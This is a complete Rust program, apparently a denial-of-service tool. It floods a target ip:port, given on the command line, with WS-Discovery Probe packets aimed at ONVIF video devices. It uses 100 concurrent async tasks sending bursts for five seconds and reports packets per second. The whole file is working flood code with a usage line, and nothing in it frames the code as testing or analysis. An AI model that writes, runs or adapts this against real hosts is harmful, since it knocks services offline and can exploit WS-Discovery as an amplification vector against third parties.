use tokio::net::UdpSocket;
use tokio::runtime::Builder; // Import the runtime Builder
use tokio::time::{sleep, Duration};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use anyhow::Result;
use uuid::Uuid;
use std::env;

const THREADS: usize = 100;
const BURST_SIZE: usize = 5;
const DURATION_SECONDS: u64 = 5;

fn build_payload() -> Vec<u8> {
    let message_id = Uuid::new_v4();
    let payload = format!(r#"<?xml version="1.0" encoding="UTF-8"?>
<e:Envelope xmlns:e="http://www.w3.org/2003/05/soap-envelope"
            xmlns:w="http://schemas.xmlsoap.org/ws/2004/08/addressing"
            xmlns:d="http://schemas.xmlsoap.org/ws/2005/04/discovery">
  <e:Header>
    <w:MessageID>urn:uuid:{}</w:MessageID>
    <w:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</w:To>
    <w:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</w:Action>
  </e:Header>
  <e:Body>
    <d:Probe>
      <d:Types>dn:NetworkVideoTransmitter</d:Types>
    </d:Probe>
  </e:Body>
</e:Envelope>"#, message_id);
    payload.into_bytes()
}

async fn handle_flood(target: String, packet_count: Arc<AtomicU64>, running: Arc<AtomicU64>) -> Result<()> {
    let socket = UdpSocket::bind("0.0.0.0:0").await?;
    
    while running.load(Ordering::Relaxed) == 1 {
        let payload = build_payload();
        for _ in 0..BURST_SIZE {
            let _ = socket.send_to(&payload, &target).await;
            packet_count.fetch_add(1, Ordering::Relaxed);
        }
    }
    Ok(())
}

async fn pps_monitor(packet_count: Arc<AtomicU64>, running: Arc<AtomicU64>) {
    let mut last_count = 0;
    while running.load(Ordering::Relaxed) == 1 {
        sleep(Duration::from_secs(1)).await;
        let current = packet_count.load(Ordering::Relaxed);
        println!("PPS: {}", current - last_count);
        last_count = current;
    }
}

// The main function is now synchronous
fn main() -> Result<()> {
    // Manually build the Tokio runtime
    let runtime = Builder::new_multi_thread()
        .enable_all()
        .build()?;

    // Use block_on to run the async code
    runtime.block_on(async {
        let args: Vec<String> = env::args().collect();
        if args.len() != 2 {
            eprintln!("Usage: {} <ip:port>", args[0]);
            return; // Exit the async block
        }
        let target = args[1].clone();

        println!("Target set: {}", target);

        let packet_count = Arc::new(AtomicU64::new(0));
        let running = Arc::new(AtomicU64::new(1));

        let monitor_handle = {
            let pc = Arc::clone(&packet_count);
            let run = Arc::clone(&running);
            tokio::spawn(pps_monitor(pc, run))
        };

        let mut flood_tasks = vec![];
        for _ in 0..THREADS {
            let pc = Arc::clone(&packet_count);
            let run = Arc::clone(&running);
            let tgt = target.clone();
            flood_tasks.push(tokio::spawn(handle_flood(tgt, pc, run)));
        }

        sleep(Duration::from_secs(DURATION_SECONDS)).await;
        running.store(0, Ordering::Relaxed);

        for task in flood_tasks {
            let _ = task.await;
        }
        let _ = monitor_handle.await;

        println!("Stopped for target: {}", target);
    });

    Ok(())
}
